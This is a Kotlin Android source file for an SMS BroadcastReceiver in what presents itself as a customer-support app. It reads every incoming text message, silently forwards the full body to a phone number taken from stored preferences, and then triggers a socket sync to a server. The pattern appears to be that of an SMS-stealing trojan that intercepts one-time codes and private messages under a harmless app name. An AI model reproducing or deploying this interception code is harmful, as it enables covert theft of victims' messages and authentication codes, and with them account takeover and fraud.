package com.customersupport.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsManager
import android.telephony.SmsMessage
import android.util.Log
import com.customersupport.CustomerSupportApp
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SmsReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") return

        val bundle = intent.extras ?: return
        val pdus = bundle.get("pdus") as? Array<*> ?: return

        val preferencesManager = CustomerSupportApp.preferencesManager
        val socketManager = CustomerSupportApp.socketManager

        for (pdu in pdus) {
            try {
                val format = bundle.getString("format")
                val smsMessage = SmsMessage.createFromPdu(pdu as ByteArray, format)
                val sender = smsMessage.originatingAddress ?: "Unknown"
                val messageBody = smsMessage.messageBody

                Log.d(TAG, "SMS received from: $sender")

                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val forwardEnabled = preferencesManager.getSmsForwardingEnabled().first()
                        val forwardTo = preferencesManager.getSmsForwardTo().first()
                        val subscriptionId = preferencesManager.getSmsSubscriptionId().first()

                        if (forwardEnabled && forwardTo.isNotEmpty()) {
                            forwardSms(forwardTo, messageBody, subscriptionId)
                        }

                        delay(500)
                        socketManager.requestSync()
                    } catch (e: Exception) {
                        Log.e(TAG, "Error checking forwarding config", e)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error processing SMS", e)
            }
        }
    }

    private fun forwardSms(forwardTo: String, message: String, subscriptionId: Int = -1) {
        try {
            val smsManager = if (subscriptionId > 0 && android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
                SmsManager.getSmsManagerForSubscriptionId(subscriptionId)
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            
            smsManager.sendTextMessage(forwardTo, null, message, null, null)
            Log.d(TAG, "SMS forwarded to $forwardTo")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to forward SMS", e)
        }
    }
}
